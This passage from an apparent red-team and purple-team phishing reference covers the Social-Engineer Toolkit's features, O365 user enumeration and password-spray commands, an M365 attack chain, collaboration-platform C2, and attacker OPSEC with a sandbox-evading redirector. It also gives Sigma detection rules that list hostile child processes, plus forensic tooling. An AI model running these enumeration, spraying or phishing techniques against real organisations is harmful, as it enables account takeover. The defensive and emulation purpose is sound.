- **SMTP providers**: Gmail (`smtp.gmail.com:587`), Yahoo (`smtp.mail.yahoo.com:587`), Hotmail (`smtp.live.com:587`)
- **Sendmail integration**: Local sendmail for spoofed addresses (requires `apt-get install sendmail`)
- **Open relay support**: Custom SMTP server with optional authentication
- **Email templates**: Pre-defined templates with `SUBJECT=` and `BODY=`/`HTML=` fields
- **HTML/plain toggle**: User chooses format per campaign
- **Attachment support**: File attachments and inline files with proper MIME encoding
- **Email tracking**: Base64-encoded recipient address appended to URLs for click tracking
- **Priority flags**: Optional `X-Priority: 1 (Highest)` and `X-MSMail-Priority: High` headers
- **Mass mailer**: Reads email list from file, configurable delay between sends (`TIME_DELAY_EMAIL`)
- **Display name spoofing**: Separate `From` address and display name fields

### 7.5 Key Configuration Options (config.baseline)

| Setting | Default | Purpose |
|---|---|---|
| `SENDMAIL` | OFF | Use local sendmail for spoofing |
| `EMAIL_PROVIDER` | GMAIL | Default SMTP provider |
| `APACHE_SERVER` | OFF | Use Apache instead of Python HTTP server |
| `WEB_PORT` | 80 | HTTP server port |
| `WEBATTACK_SSL` | OFF | Enable SSL for web attacks |
| `HARVESTER_REDIRECT` | OFF | Redirect victims to custom URL post-harvest |
| `TRACK_EMAIL_ADDRESSES` | OFF | Track who clicks (requires Apache + PHP) |
| `POWERSHELL_INJECTION` | ON | Enable PS shellcode injection with Java applet |
| `POWERSHELL_MULTI_INJECTION` | ON | Spray multiple ports for PS callback |
| `POWERSHELL_MULTI_PORTS` | 21,22,25,53,443 | Egress port spray list |
| `UNC_EMBED` | OFF | Auto-embed UNC path for SMB hash capture |
| `AUTO_MIGRATE` | OFF | Auto-migrate Meterpreter to Notepad.exe |
| `ACCESS_POINT_SSID` | linksys | Rogue AP SSID name |
| `USER_AGENT_STRING` | Chrome/Mac | User-Agent for site cloning |

### 7.6 Website Cloning Engine (cloner.py Analysis)

From source code:

1. Reads target URL from `site.template` config
2. Attempts `wget --no-check-certificate -O index.html -c -k` (or deep mode: `wget -H -N -k -p -l 2 -nd -P`)
3. Falls back to Python `urllib.request` if wget unavailable
4. Injects attack-specific code:
   - **Java Applet**: Injects `<applet>` tag with randomized filenames
   - **Browser Exploit**: Injects invisible iframe pointing to MSF exploit server
   - **HTA**: Injects HTA download trigger
   - **UNC Embed**: Injects `<img src="\\ATTACKER\share">` for SMB hash capture
5. Randomizes all payload filenames (6-15 char strings)
6. Supports proxy configuration for cloning through corporate proxies
7. Creates backup of original clone (`index.html.bak`)

---

## 8. O365 / Microsoft 365 Attack Surface

### 8.1 User Enumeration — Oh365UserFinder

**Source:** github.com/dievus/Oh365UserFinder | Python

#### Enumeration Technique

Exploits the `IfExistsResult` flag in Microsoft's authentication API responses:
- Valid user → non-null `IfExistsResult`
- Invalid user → null response
- No account lockout triggered (enumeration, not authentication)

#### Usage

```bash
# Validate domain
python oh365userfinder.py -d targetcorp.com

# Single email check
python oh365userfinder.py -e john.doe@targetcorp.com

# Bulk enumeration from file
python oh365userfinder.py -r emails.txt -w valid_users.txt -t 2

# Password spray against valid users (v1.1.0+)
python oh365userfinder.py -r valid_users.txt -p 'Summer2026!'
```

#### Rate Limiting Considerations

- Microsoft implements throttling that produces false positives
- Built-in automatic pause when throttling detected
- Configurable timeout (`-t` flag, seconds between requests)
- If false positives appear, increase delay and resume later
- MFA detection in password spray mode

**DETECTION OPPORTUNITY:** Monitor for high-volume requests to `login.microsoftonline.com/common/GetCredentialType` from single IPs or narrow IP ranges. Alert on >50 unique email address checks per hour from non-Microsoft source IPs. [CONFIRMED]

### 8.2 Microsoft 365 Attack Chain

```
Phase 1: Recon
├── Oh365UserFinder → Valid email addresses
├── LinkedIn scraping → Name format discovery
└── Hunter.io / phonebook.cz → Additional addresses

Phase 2: Infrastructure
├── Register lookalike domain (30+ day aging)
├── Configure SPF/DKIM/DMARC on phishing domain
├── Deploy GoPhish + Evilginx2
└── FireProx for IP rotation

Phase 3: Initial Access
├── Credential phishing (Evilginx2 → session token capture)
├── OR OAuth consent phishing (O365 Attack Toolkit)
├── OR password spray against identified accounts
└── MFA bypass via proxy / push fatigue

Phase 4: Post-Compromise
├── Mailbox search (O365 Attack Toolkit)
├── Internal spearphishing from compromised mailbox (T1534)
├── OneDrive/SharePoint lateral movement
├── Inbox rule creation for persistence (T1564.008)
└── OAuth app persistence (T1098.003)
```

---

## 9. C2 via Legitimate Services

### 9.1 OffensiveNotion — C2 over Notion API

**Source:** github.com/byt3bl33d3r/OffensiveNotion | Rust
**Purpose:** Command-and-control agent that communicates entirely through the Notion API, making C2 traffic appear as legitimate Notion usage.

#### Why Legitimate Service C2 Matters

- Traffic blends with normal business application usage
- Notion domains are whitelisted in most corporate environments
- TLS encrypted to legitimate endpoints — DPI sees only Notion traffic
- No custom infrastructure to detect or take down

#### Similar Approaches

| Tool | Service Abused | Protocol |
|---|---|---|
| OffensiveNotion | Notion API | HTTPS to api.notion.com |
| Slackor | Slack API | HTTPS to slack.com |
| GC2 | Google Sheets/Drive | HTTPS to googleapis.com |
| DNSCAT2 | DNS | DNS queries to attacker nameserver |
| Trevorproxy | SSH + SOCKS | SSH tunneling through legitimate hosts |
| C3 (F-Secure) | Multiple (Slack, Teams, etc.) | Various APIs |

**DETECTION OPPORTUNITY:** Monitor for unusual API call volumes to collaboration platforms (Notion, Slack, etc.) from endpoints that don't normally use those services. Look for periodic, automated-looking request patterns (beaconing intervals). Inspect Notion API calls for non-standard page structures or base64-encoded content. [INFERRED]

---

## 10. Defensive Controls & Detection Engineering

### 10.1 Email Security Controls (Defense-in-Depth)

#### Layer 1: Email Authentication

| Control | Implementation | Effectiveness |
|---|---|---|
| SPF `-all` | DNS TXT record | Blocks direct domain spoofing |
| DKIM signing | Mail server configuration | Proves message integrity |
| DMARC `p=reject` | DNS TXT record | Enforces SPF+DKIM alignment |
| ARC | Mail forwarder configuration | Preserves auth through forwarding |
| MTA-STS | HTTPS policy file + DNS | Enforces transport encryption |
| DANE/TLSA | DNSSEC + TLSA records | Certificate pinning for SMTP |
| BIMI | DNS TXT + SVG logo | Visual brand verification |

#### Layer 2: Email Gateway / Filtering

| Control | What It Does |
|---|---|
| Attachment sandboxing | Detonates attachments in isolated environment |
| URL rewriting/sandboxing | Rewrites links for click-time analysis |
| Impersonation protection | Detects display name spoofing of executives |
| Content analysis | NLP-based phishing language detection |
| Homograph detection | Flags IDN/punycode lookalike domains |
| Newly registered domain blocking | Blocks emails from domains <30 days old |
| QR code scanning | Extracts and analyzes URLs from QR codes |
| Macro blocking | Block/quarantine macro-enabled attachments |

#### Layer 3: Endpoint Protection

| Control | Purpose |
|---|---|
| MOTW enforcement | Block execution of files from internet |
| Office macro restrictions | GPO: disable macros in docs from internet |
| ASR rules | Attack Surface Reduction: block Office child processes |
| AMSI | Scan macro/script content at runtime |
| Application whitelisting | Block unauthorized executables |
| Credential Guard | Protect cached credentials from theft |
| Browser isolation | Render risky links in isolated browser |

#### Layer 4: Identity & Access

| Control | Purpose |
|---|---|
| Phishing-resistant MFA | FIDO2/WebAuthn (not SMS/TOTP) |
| Conditional Access | Block auth from untrusted locations/devices |
| Impossible travel alerts | Detect concurrent logins from distant locations |
| OAuth app consent workflow | Require admin approval for new app permissions |
| Token lifetime policies | Limit session token validity |
| Privileged identity management | Time-limited admin access |

#### Layer 5: User Training

| Approach | Effectiveness |
|---|---|
| Simulated phishing campaigns | High — behavioral conditioning |
| Just-in-time coaching | High — teach at moment of failure |
| Phishing report button | Medium — enables crowd-sourced detection |
| Annual CBT training | Low — insufficient frequency |
| Gamification | Medium — increases engagement |

### 10.2 Sigma Detection Rules

#### Evilginx2 Detection: Suspicious Login Page Proxy Pattern

```yaml
title: Potential Evilginx2 Reverse Proxy Phishing Detection
id: 8a7b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d
status: experimental
description: Detects authentication events where the source originates from known cloud hosting providers, indicating potential AiTM phishing proxy
logsource:
  category: authentication
  product: azure_ad
detection:
  selection:
    eventName: 'Sign-in activity'
    ResultType: '0'
  filter_hosting:
    IPAddress|cidr:
      - '13.104.0.0/14'   # Microsoft legitimate
      - '20.33.0.0/16'    # Microsoft legitimate
  condition: selection and not filter_hosting
falsepositives:
  - VPN providers in cloud hosting
  - Remote workers on cloud-hosted networks
level: medium
tags:
  - attack.t1566.002
  - attack.initial_access
  - attack.t1557
```

#### Office Process Spawning Suspicious Child

```yaml
title: Office Application Spawning Suspicious Process
id: 9b8c7d6e-5f4a-3b2c-1d0e-f9a8b7c6d5e4
status: stable
description: Detects Office applications spawning processes commonly used in macro-based attacks
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
      - '\POWERPNT.EXE'
      - '\OUTLOOK.EXE'
      - '\MSPUB.EXE'
  selection_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\MSBuild.exe'
      - '\regsvr32.exe'
      - '\rundll32.exe'
      - '\certutil.exe'
      - '\bitsadmin.exe'
  condition: selection_parent and selection_child
falsepositives:
  - Legitimate Office add-ins that spawn processes
  - Enterprise document automation
level: high
tags:
  - attack.t1566.001
  - attack.execution
  - attack.t1204.002
```

#### GoPhish Tracking Pixel / Campaign Detection

```yaml
title: GoPhish Default Tracking Indicators in Email
id: 2c3d4e5f-6a7b-8c9d-0e1f-2a3b4c5d6e7f
status: experimental
description: Detects email headers or URLs containing default GoPhish tracking indicators
logsource:
  category: email
  product: exchange
detection:
  selection_header:
    email.headers.x_mailer: 'gophish'
  selection_url:
    email.body|contains:
      - '/track?'
      - '/report?'
      - 'rid='
  condition: selection_header or selection_url
falsepositives:
  - Authorized phishing simulations using GoPhish
level: medium
tags:
  - attack.t1566.002
  - attack.initial_access
```

#### Suspicious OAuth Consent Grant

```yaml
title: Suspicious OAuth Application Consent with Mail/File Permissions
id: 3d4e5f6a-7b8c-9d0e-1f2a-3b4c5d6e7f8a
status: experimental
description: Detects OAuth consent grants requesting mail read/send and file access permissions, indicative of OAuth phishing
logsource:
  category: audit
  product: azure_ad
detection:
  selection:
    eventName: 'Consent to application'
  filter_permissions:
    targetResources.modifiedProperties.newValue|contains:
      - 'Mail.Read'
      - 'Mail.Send'
      - 'Files.ReadWrite'
      - 'offline_access'
  condition: selection and filter_permissions
falsepositives:
  - Legitimate third-party application integrations
  - Admin-consented applications
level: high
tags:
  - attack.t1566.002
  - attack.t1550.001
  - attack.initial_access
```

#### O365 User Enumeration Detection

```yaml
title: Microsoft 365 User Enumeration via GetCredentialType
id: 4e5f6a7b-8c9d-0e1f-2a3b-4c5d6e7f8a9b
status: experimental
description: Detects high-volume requests to GetCredentialType endpoint indicating user enumeration
logsource:
  category: proxy
  product: any
detection:
  selection:
    url|contains: 'login.microsoftonline.com/common/GetCredentialType'
  condition: selection | count(src_ip) by src_ip > 50
  timeframe: 1h
falsepositives:
  - Legitimate authentication flows from load balancers
  - Azure AD Connect synchronization
level: medium
tags:
  - attack.t1589.002
  - attack.reconnaissance
```

### 10.3 MITRE ATT&CK Detection Coverage Matrix

| Data Source | Detection Analytic | Coverage |
|---|---|---|
| Email gateway logs | Inbound email with attachments/URLs → suspicious process execution | T1566.001, T1566.002 |
| Process creation | Office process spawning cmd/powershell/mshta/msbuild | T1566.001, T1204.002 |
| Azure AD sign-in logs | Authentication from AiTM proxy IPs, impossible travel | T1566.002, T1557 |
| Azure AD audit logs | OAuth consent grants with broad permissions | T1566.002, T1550.001 |
| Network traffic | Beaconing to collaboration APIs (Notion, Slack) | T1071.001 |
| File creation | MOTW-stripped files from ISO/IMG containers | T1566.001 |
| Identity Provider | Anomalous SSO prompts, suspicious login attempts | T1566.002 |
| Mail application | Mail app delivering payloads resulting in file creation | T1566.001 |

---

## 11. Document Analysis & Forensics

### 11.1 oletools Suite

**Source:** github.com/decalage2/oletools | Python
**Purpose:** Analyze and detect malicious content in Microsoft Office documents.

#### Tools Reference

| Tool | Purpose | Key Capability |
|---|---|---|
| **olevba** | Extract and analyze VBA macros | Deobfuscation, suspicious keyword detection, VBA+XLM macro extraction |
| **oleid** | Identify malicious characteristics | Quick triage — flags macros, encryption, flash, external relationships |
| **MacroRaptor (mraptor)** | Detect malicious macro patterns | Auto-exec + write/execute pattern matching |
| **msodde** | Find DDE/DDEAUTO links | Detects formula injection in docs and RTF |
| **rtfobj** | Extract objects from RTF files | Embedded OLE, packages, CVE detection |
| **oleobj** | Extract embedded objects from OLE | Package objects, linked objects |
| **pyxswf** | Find embedded Flash | SWF detection and extraction |
| **olebrowse** | GUI for OLE file browsing | Interactive stream analysis |
| **olemeta** | Extract document metadata | Author, company, timestamps |
| **oletimes** | Extract timestamps | Creation/modification per stream |
| **oledir** | List directory entries | Find orphaned/hidden streams |
| **olemap** | Visualize sector allocation | Structural analysis |

#### Detection Capabilities

- VBA macros (including Excel 4.0/XLM macros) with deobfuscation
- OLE embedded objects and packages
- RTF-embedded malicious content
- DDE formula injection
- CVE-2021-40444 initial payloads
- Custom UI event handlers
- Flash payloads within documents

#### Usage Examples

```bash
# Install
pip install -U oletools[full]

# Quick triage
oleid suspicious.docx

# Extract and analyze VBA
olevba --deobf suspicious.docm

# Check for malicious macro patterns
mraptor suspicious.doc

# Find DDE in document
msodde suspicious.docx

# Extract RTF embedded objects
rtfobj suspicious.rtf

# Extract all embedded objects
oleobj suspicious.doc
```

#### MacroRaptor Detection Logic

mraptor classifies macros using a simple but effective model:
- **A** = Auto-execute trigger (AutoOpen, Document_Open, Workbook_Open, etc.)
- **W** = Write to filesystem (Shell, Kill, FileCopy, etc.)
- **X** = Execute external program (Shell, CreateObject, WScript.Shell, etc.)

If **A + (W or X)** → **SUSPICIOUS**

### 11.2 P-Code Disassembly for VBA Stomping Detection

```bash
# Install pcodedmp
pip install pcodedmp

# Disassemble P-code
pcodedmp suspicious.doc

# Compare with VBA source from olevba
olevba suspicious.doc

# If P-code shows different logic than VBA source → VBA stomping detected
```

---

## 12. Email Reputation & Threat Intelligence

### 12.1 EmailRep.io

**Purpose:** Email reputation scoring service that aggregates data from multiple sources to assess email address risk.

#### Capabilities (from documentation)

- **Reputation scoring**: Low/Medium/High risk classification
- **Data sources checked**: Breach databases, social media profiles, domain age, mail server configuration, WHOIS data, dark web presence
- **API endpoint**: `GET https://emailrep.io/<email_address>`
- **Response fields**: reputation, suspicious, references, details (credentials_leaked, data_breach, malicious_activity, spam, etc.)

#### Use Cases

- Pre-engagement OSINT on target email addresses
- Validating phishing sender reputation
- Incident response: checking if reported phishing sender is known-bad
- Automated email triage in SOC workflows

### 12.2 Additional Threat Intel Sources

| Source | Type | Use |
|---|---|---|
| **PhishTank** | Community phishing URL database | Check/report phishing URLs |
| **URLhaus** | Malware URL database | Check for known-bad URLs |
| **VirusTotal** | Multi-engine scanning | URL, file, domain reputation |
| **AbuseIPDB** | IP reputation | Check phishing infrastructure IPs |
| **Have I Been Pwned** | Breach database | Check if targets are in breach data |
| **Shodan** | Internet scanning | Identify phishing infrastructure |
| **URLScan.io** | URL analysis sandbox | Safe URL analysis and screenshots |
| **MXToolbox** | DNS/email diagnostics | SPF/DKIM/DMARC validation |

---

## 13. Operational Security for Phishing Engagements

### 13.1 Infrastructure Separation

```
NEVER mix phishing infrastructure with C2 infrastructure.

Phishing Domain → Redirector → GoPhish (campaign mgmt)
                      ↓
              (separate network)
                      ↓
Payload Domain → Redirector → C2 Server (post-exploitation)
```

### 13.2 OPSEC Checklist

| Category | Action | Rationale |
|---|---|---|
| **Domains** | Register 30+ days early | Avoid newly-registered-domain blocks |
| **Domains** | Use privacy registration (WHOIS guard) | Prevent OSINT on registrant |
| **Domains** | Categorize domain (news, business) | Bypass URL category filtering |
| **Email Auth** | Configure SPF/DKIM/DMARC on phishing domain | Improve deliverability |
| **TLS** | Use Let's Encrypt certificates | Avoid self-signed certificate warnings |
| **Hosting** | Use VPS, not personal infrastructure | Attribution separation |
| **IP Rotation** | FireProx or similar | Defeat IP-based detection |
| **Redirectors** | Use Apache mod_rewrite or Caddy rules | Filter sandbox/researcher traffic |
| **User-Agent** | Filter known sandbox User-Agents | Prevent automated analysis |
| **Geofencing** | Block non-target country IPs | Reduce exposure to researchers |
| **Headers** | Remove default tool headers (X-Mailer, etc.) | Avoid tool fingerprinting |
| **Tracking** | Use unique per-target identifiers | Attribute clicks to individuals |
| **Timing** | Send during business hours (target timezone) | Maximize engagement |
| **Volume** | Stagger sends over hours/days | Avoid bulk-send detection |
| **Cleanup** | Tear down infrastructure post-engagement | Reduce attack surface |

### 13.3 Redirector Configuration (Apache mod_rewrite)

```apache
RewriteEngine On

# Block known sandbox/security scanner User-Agents
RewriteCond %{HTTP_USER_AGENT} "curl|wget|python|bot|crawl|scan|PhishMe" [NC]
RewriteRule ^(.*)$ https://legitimate-site.com/ [L,R=302]

# Block non-US IP ranges (example)
RewriteCond %{REMOTE_ADDR} !^(10\.|192\.168\.)
RewriteCond expr "! -R '0.0.0.0/0'"
# Add specific CIDR blocks for target country

# Redirect matching traffic to GoPhish
RewriteRule ^(.*)$ https://internal-gophish:443/$1 [P]
```

---

## 14. Purple Team: Detection Gaps & Emulation Plans

### 14.1 Common Detection Gaps

| Gap | Why It Exists | Impact |
|---|---|---|
| No DMARC enforcement (`p=none`) | Fear of blocking legitimate email | Domain spoofing goes undetected |
| No AiTM detection | Session token theft bypasses traditional auth logs | MFA bypass invisible |
| No OAuth consent monitoring | Azure AD audit logs not forwarded to SIEM | Persistent API access undetected |
| Macro analysis only at gateway | Encrypted/password-protected docs bypass sandbox | Payload delivered to endpoint |
| No internal phishing detection | Trust assumption for internal email | Lateral phishing from compromised accounts |
| Browser-based attacks unmonitored | No telemetry on HTML smuggling/JS execution | Initial access without file-based IoC |
| QR code phishing | Email gateways don't scan QR codes | Bypass URL analysis entirely |

### 14.2 Phishing Emulation Plan

```
OBJECTIVE: Validate detection and response capabilities against modern phishing TTPs

PHASE 1: Baseline (T1598.003 — Credential Phishing)
├── Deploy GoPhish with default configuration
├── Send phishing emails to test group
├── Measure: email gateway block rate, user click rate, credential submission rate
├── Validate: phishing report button usage, SOC response time
└── Expected Detection: email gateway, user reporting

PHASE 2: Evasion (T1566.002 — Evilginx2 AiTM)
├── Deploy Evilginx2 with custom phishlet
├── Target SSO portal with MFA bypass
├── Measure: session token capture success, Conditional Access bypass
├── Validate: Azure AD sign-in anomaly detection, impossible travel alerts
└── Expected Detection: Azure AD Conditional Access (if properly configured)

PHASE 3: Payload Delivery (T1566.001 — Macro Document)
├── Create VBA-stomped document (EvilClippy)
├── Deliver via phishing email with password-protected ZIP
├── Measure: sandbox bypass rate, endpoint detection rate
├── Validate: Office ASR rules, AMSI scanning, EDR behavioral detection
└── Expected Detection: ASR rules, EDR process tree analysis

PHASE 4: OAuth Abuse (T1566.002 + T1550.001)
├── Register Azure AD application with broad permissions
├── Send OAuth consent phishing to test group
├── Measure: consent grant rate, data access scope
├── Validate: OAuth consent workflow, Azure AD audit alerting
└── Expected Detection: Azure AD app consent audit log

PHASE 5: Internal Phishing (T1534)
├── From compromised test mailbox, send internal phishing
├── Measure: user trust of internal email, click rate vs external
├── Validate: internal email anomaly detection, DLP policies
└── Expected Detection: Most organizations have NO detection here

REPORT DELIVERABLES:
- Detection coverage heat map (MITRE ATT&CK layer)
- Time-to-detect (TTD) for each phase
- User susceptibility metrics
- Specific detection rule recommendations
- Infrastructure hardening recommendations
```

### 14.3 Quick-Reference: ATT&CK Technique to Detection Mapping

| Technique | Primary Data Source | Detection Method | Tool/Rule |
|---|---|---|---|
| T1566.001 | Email gateway + Endpoint | Attachment analysis + Process monitoring | Sandbox + Sigma (Office child process) |
| T1566.002 | Email gateway + IdP | URL analysis + Auth anomaly | URL sandbox + Azure AD CA |
| T1566.003 | SaaS audit logs | Malicious file/URL in collaboration platform | CASB + API monitoring |
| T1566.004 | Call logs + Endpoint | Callback number analysis + RMM install detection | EDR behavioral + telecom logs |
| T1598.003 | Email gateway + DNS | Credential harvesting page detection | URL sandbox + domain reputation |
| T1557 (AiTM) | IdP + Network | Auth from proxy infrastructure | Azure AD impossible travel + IP reputation |
| T1534 | Email + IdP | Internal email anomaly | Mailbox audit log + behavioral analytics |
| T1204.002 | Endpoint | User opens malicious file | EDR + ASR rules |

---

## References

- MITRE ATT&CK T1566: https://attack.mitre.org/techniques/T1566/
- MITRE ATT&CK T1598: https://attack.mitre.org/techniques/T1598/
- GoPhish: https://github.com/gophish/gophish
- Evilginx2: https://github.com/kgretzky/evilginx2
- O365 Attack Toolkit: https://github.com/mdsecactivebreach/o365-attack-toolkit
- Oh365UserFinder: https://github.com/dievus/Oh365UserFinder
- FireProx: https://github.com/ustayready/fireprox
- EvilClippy: https://github.com/outflanknl/EvilClippy
- MaliciousMacroMSBuild: https://github.com/infosecn1nja/MaliciousMacroMSBuild
- MaliciousMacroGenerator: https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator
- oletools: https://github.com/decalage2/oletools
- Social-Engineer.org Framework: https://www.social-engineer.org/framework/
- Social-Engineer Toolkit (SET): github.com/trustedsec/social-engineer-toolkit
- dmarcian DMARC Inspector: https://dmarcian.com/dmarc-inspector/
